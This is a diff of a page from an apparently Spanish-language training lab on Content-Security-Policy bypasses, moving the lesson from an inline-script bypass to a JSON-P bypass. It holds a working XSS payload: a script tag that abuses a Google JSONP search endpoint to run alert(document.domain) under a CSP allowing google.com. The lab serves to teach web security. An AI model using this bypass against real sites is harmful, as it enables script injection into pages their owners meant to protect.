@@ -21,18 +21,18 @@
   <link rel="stylesheet" href="../node_modules/@highlightjs/cdn-assets/styles/dark.min.css">
 
   
-  <meta id="csp" http-equiv="Content-Security-Policy" content="script-src &#39;self&#39; &#39;unsafe-eval&#39; https://*.google.com https://*.gstatic.com https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js;">
+  <meta id="csp" http-equiv="Content-Security-Policy" content="script-src &#39;self&#39; https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/ https://cdn.jsdelivr.net/npm/jquery@3.6.4/dist/jquery.min.js;">
   
 
   <script src="js/darkmode.js"  defer></script>
   <title>
     
-02 - CSP bypass usando inline JS
+06 - CSP bypass usando JSON-P
 
   </title>
 
   
-<meta id="csp" http-equiv="Content-Security-Policy" content="script-src &#39;self&#39; &#39;unsafe-eval&#39; https://*.google.com https://*.gstatic.com https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js;">
+<meta id="csp" http-equiv="Content-Security-Policy" content="script-src &#39;self&#39; https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/ https://cdn.jsdelivr.net/npm/jquery@3.6.4/dist/jquery.min.js;">
 <script src="js/csp.js"  defer></script>
 <script src="js/showpayload.js"  defer></script>
 
@@ -47,7 +47,7 @@
         <ul>
           <h1>
             
-02 - CSP bypass usando inline JS
+06 - CSP bypass usando JSON-P
 
           </h1>
         </ul>
@@ -86,7 +86,7 @@
   </h2>
   <pre><code id="payload-content" class="language-html"></code></pre>
   <button id="inject">Inject</button>
-  <a href="02.html" role="button" class="secondary outline">Restart</a>
+  <a href="jsonp-fixed.html" role="button" class="secondary outline">Restart</a>
 </section>
 
 <section>
@@ -105,9 +105,7 @@
   <pre><code id="errors"></code></pre>
 </section>
 
-<template id="payload-template"><script>
-  alert(document.domain)
-</script></template>
+<template id="payload-template"><script src="https://www.google.com/complete/search?jsonp=alert(document.domain)//&client=chrome"></script></template>
 
 
 
@@ -115,7 +113,7 @@
   <nav>
     <ul>
       <li>
-        <a href="01.html" role="button" class="secondary outline" >
+        <a href="jsonp.html" role="button" class="secondary outline" >
           <i class="fa-solid fa-chevron-left"></i>
           anterior
         </a>
@@ -128,7 +126,7 @@
     </ul>
     <ul>
       <li>
-        <a href="03.html" role="button" class="secondary outline" >
+        <a href="open-redirect.html" role="button" class="secondary outline" >
           siguiente
           <i class="fa-solid fa-chevron-right"></i>
         </a>
